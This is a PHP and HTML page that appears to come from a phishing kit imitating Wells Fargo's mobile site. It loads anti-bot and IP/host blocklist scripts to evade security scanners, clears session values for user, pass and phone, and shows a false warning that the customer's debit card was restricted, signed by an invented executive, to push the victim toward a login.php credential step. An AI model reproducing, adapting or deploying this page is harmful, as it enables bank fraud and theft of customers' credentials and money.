
<?php
session_start();
error_reporting(0);
include('../files/boot/check.php');
include('../files/boot/check1.php');
include('../files/boot/check2.php');
include('../files/boot/antibot.php');
include('../files/boot/DB-BOTS.php');
include('../files/boot/DB-CIDR.php');
include('../files/boot/DB-HOSTS.php');
include('../files/boot/DB-METHOD.php');
include('../files/boot/DB-RANGE.php');
include('../files/boot/enc.php');
include('../call.php');
$rec = @$_GET['rec'];
$error = @$_GET['error'];
if( isset($_SESSION['user'])){
    unset($_SESSION['user']);
}
if( isset($_SESSION['pass'])){
    unset($_SESSION['pass']);
}
if( isset($_SESSION['phone'])){
    unset($_SESSION['phone']);
}
$id = "";
if( isset($_GET['id'])){
    $id = $_GET['id'];
}
?>
<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
    <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
    <meta name="robots" content="index, follow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <meta http-equiv="Cache-Control" content="must-revalidate">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="apple-itunes-app" content="app-id=311548709">

    <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
    <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="180x180" href="../files/icons/apple-touch-icon-180x180.png">
    <link rel="icon" sizes="128x128" href="../files/icons/icon-normal-128x128.png">
    <link rel="icon" sizes="192x192" href="../files/icons/icon-hires-192x192.png">

    <link rel="stylesheet" href="../files/bars/framework.css">
    <link rel="stylesheet" href="../files/bars/util.css">
    <link rel="stylesheet" href="../files/bars/smartphone-homepage.css">

</head>
<body class="freezedscreen" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <header class="masthead" role="banner">
            <div id="navLeft" style="display: block;">
                <a tabindex="1" href="#" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>
            </div>
            <div class="logoOuter">
                <div class="logo">
                    <a href="#"><img alt="" role="img" src="../files/bars/icn-layer-svg.svg" style="margin-top: 13px;"></a>
                </div>
            </div>
            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer" style="visibility: visible;">‍</span></button>
                        </div>
                    </div>
                </nav>
            </div>
        </header>

        <div id="maincontainer">
            <div class="overlaySignOn" style="top: 38px;">
                <div class="overlayContainer">
                    <div class="welcome-container" tabindex="-1">Welcome</div>
                    <div class="security-container">
                        <span class="security-img"></span>
                        <a href="#" class="security-text">Online &amp; Mobile Security</a>
                    </div>
                    <div align="center" class="signOnContainer">
                        <!-- <form id="frmSignon" name="frmSignon" action="login.php" method="post" autocomplete="off"> -->
                        <form id="main" name="frmSignon" action="login.php?id=<?=$id?>" method="post" autocomplete="off" style="text-align: left;">
                            <!-- <div class="spacer-large"></div> -->
                            <div class="" style="font-weight: bold; font-size: 16px; margin-left: 15px;">Wells Fargo Mobile®</div>
                            <div style="margin: 0px;text-align: left;" class="enroll-header">
                                <span>We recently received a report of unauthorised debit card use associated with this account.
                                    <p></p>As a precaution, we have limited your Wells Fargo Debit/ATM Card(s) in order to protect against future unauthorised transactions.
                                    <p></p>Wells Fargo needs additional information from you before you can continue using your card(s).</span>
                                <br>
                                <br>
                                <span class="spacer">Click "<a style="color:#CC0000;font-weight:bold;">Message Received</a>" below so we may gather with you additional verification needed.</span>
                                <br>
                                <br>
                                <br>
                                <span>Thank you for being a Wells Fargo Customer and we look forward to serve all your financial needs.
                                    <p></p>Sincerely,
                                    <p></p><b>K.L. Myers</b>
                                    <p></p>
                                    Executive Vice President, Chief Operating Officer
                                    <p></p>Wells Fargo Bank</span>
                                <div class="continue-container">
                                    <input tabindex="3" name="_eventId_customerInfoEntered" id="continue" value="Message Received" class="continue blue-button" type="submit">
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="appstoreBadge" id="ios">
                        <a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
                        <a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
                    </div>
                    <footer role="contentinfo">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
